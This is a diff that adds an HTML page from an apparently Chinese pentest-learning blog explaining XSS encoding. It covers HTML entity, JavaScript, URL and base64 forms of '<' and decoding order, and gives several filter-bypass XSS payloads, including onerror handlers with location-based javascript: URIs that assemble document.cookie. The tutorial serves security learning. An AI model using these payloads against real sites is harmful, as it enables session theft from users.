@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>xss基础编码</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/xss-encode-decode.html" rel="bookmark"
+           title="Permalink to xss基础编码">xss基础编码</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-03-02T00:00:00+01:00">
+                <a href='#'>03/02/2017 </a>
+                <a href="/category/learning.html">Learning</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>html的实体编码，比如十进制编码和十六进制编码，需要放在html标签里面。</p>
+<div class="highlight"><pre><span></span><span class="n">Fun</span> <span class="n">fact</span> <span class="n">Decoding</span> <span class="k">Order</span><span class="p">:</span>
+<span class="mi">1</span><span class="p">.</span> <span class="n">HTML</span> <span class="n">Decoding</span>
+<span class="mi">2</span><span class="p">.</span> <span class="n">URL</span> <span class="n">Decoding</span>
+<span class="mi">3</span><span class="p">.</span> <span class="n">Javascript</span> <span class="n">Decoding</span>
+
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">slides</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">mscasharjaved</span><span class="o">/</span><span class="n">deck</span><span class="o">-</span><span class="mi">13</span><span class="o">#/</span><span class="mi">169</span>
+</pre></div>
+
+
+<p>三种编码，对于html来说是(10进制和16进制）</p>
+<h3>html尖括号</h3>
+<ul>
+<li>十进制：<code>&amp;#60;</code> </li>
+<li>html十六: <code>&amp;#x3c;</code></li>
+</ul>
+<h3>javascript的八进制和16进制以及unicode编码:</h3>
+<p>尖括号－－&gt; </p>
+<ul>
+<li>八进制:<code>\74</code> </li>
+<li>十六进制: <code>\x3c</code></li>
+<li>unicode编码: <code>\u003c</code></li>
+</ul>
+<h3>url编码及base64编码(&lt;)</h3>
+<ul>
+<li>url: %3C </li>
+<li>base64: PA==</li>
+</ul>
+<h3>html实体编码本身存在的意义是防止与HTML本身语义标记的冲突：</h3>
+<p>举个例子：</p>
+<div class="highlight"><pre><span></span><span class="ni">&amp;lt;</span>script<span class="ni">&amp;gt;</span>alert(1)<span class="ni">&amp;lt;</span>/script<span class="ni">&amp;gt;</span>
+<span class="nt">&lt;script&gt;</span>alert(66)<span class="nt">&lt;/script&gt;</span>
+</pre></div>
+
+
+<p>上面保存未html文档之后，用浏览器打开，弹出的是66，查看源代码可以看到两个是一模一样，不同的就是第二个可以执行，第一个只是在页面显示出来。</p>
+<p>那么正常网站的需求是这样的：</p>
+<p>用户输入--&gt;filter--&gt;浏览器显示</p>
+<p>如果filter不能很好的处理转义标签，最终展现的页面就可能会执行用户输入的有害代码。呐，这就是xss</p>
+<p>壮士，我们来瞅瞅如下个链接可以得出什么结果：</p>
+<ul>
+<li>http://wooyun.jozxing.cc/static/drops/tips-689.html</li>
+<li>https://www.leavesongs.com/PENETRATION/use-location-xss-bypass.html</li>
+<li>http://wooyun.jozxing.cc/static/drops/papers-894.html</li>
+<li>https://www.leavesongs.com/PENETRATION/xss-collect.html</li>
+</ul>
+<p>html编码和js编码不可以到处乱用，到处乱用也可以，但是要遵守规则：
+比如：
+<code>&lt;img src="x" onerror="&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;"&gt;</code></p>
+<p>上面这一坨可以弹，这是html实体编码，为毛不可以js编码呢，因为他在html标签里面啊。</p>
+<p>你说你非要用js，OK，用P神里面的文章可以额这样来实现：
+<code>&lt;img src="1" onerror=location="javascript:alert%281%29"&gt;</code></p>
+<p>利用location变形,就可以在后面使用js编码咯：</p>
+<p><code>&lt;img src="1" onerror=location="javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0036\u0036\u0036\u0022\u0029"&gt;</code></p>
+<h3>只有在js中才可以拼接字符串</h3>
+<div class="highlight"><pre><span></span> <span class="n">Wrong</span><span class="p">:</span>
+ <span class="o">&lt;</span><span class="n">img</span><span class="o">/</span><span class="n">src</span><span class="o">=</span><span class="s1">&#39;x&#39;</span><span class="n">onerror</span><span class="o">=</span><span class="s1">&#39;al&#39;</span><span class="o">+</span><span class="s1">&#39;er&#39;</span><span class="o">+</span><span class="s1">&#39;t(1)&#39;</span><span class="o">&gt;</span>
+ <span class="k">right</span><span class="p">:</span>
+ <span class="o">&lt;</span><span class="n">img</span><span class="o">/</span><span class="n">src</span><span class="o">=</span><span class="s1">&#39;x&#39;</span><span class="n">onerror</span><span class="o">=</span><span class="k">location</span><span class="o">=</span><span class="ss">&quot;javascr&quot;</span><span class="o">+</span><span class="ss">&quot;ipt:al&quot;</span><span class="o">+</span><span class="ss">&quot;ert%28docu&quot;</span><span class="o">+</span><span class="ss">&quot;ment.co&quot;</span><span class="o">+</span><span class="ss">&quot;okie%29&quot;</span><span class="o">&gt;</span>
+</pre></div>
+
+
+<p>上面的是利用location来变形xss，现在来瞅瞅如下的代码:</p>
+<div class="highlight"><pre><span></span><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="nt">&gt;</span>this is alert(1)<span class="nt">&lt;/a&gt;</span>
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;javascript:&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#50;&amp;#51;&amp;#41;&amp;#10;&quot;</span><span class="nt">&gt;</span>this is html encode<span class="nt">&lt;/a&gt;</span>
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;javascript:%61%6c%65%72%74%28%32%32%29&quot;</span><span class="nt">&gt;</span>abc<span class="nt">&lt;/a&gt;</span>
+<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;1&quot;</span> <span class="na">onerror=</span><span class="s">location=&quot;javascr&quot;+&quot;ipt:al&quot;+&quot;ert%28docu&quot;+&quot;ment.co&quot;+&quot;okie%29&quot;</span><span class="nt">&gt;</span>
+</pre></div>
+
+
+<ul>
+<li>第二个和第四个都用到了url encode，貌似在html标签和js里面都能使用URL encodeing</li>
+<li>其中第四个里面转换为location，location可以加载javascript伪协议，所以这里可以写js编码转换。</li>
+</ul>
+<p>最后我门来欣赏下各路风骚的payload:
+http://wooyun.jozxing.cc/static/drops/papers-894.html
+如果链接失效了，请搜索xss 比赛write up第一期</p>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
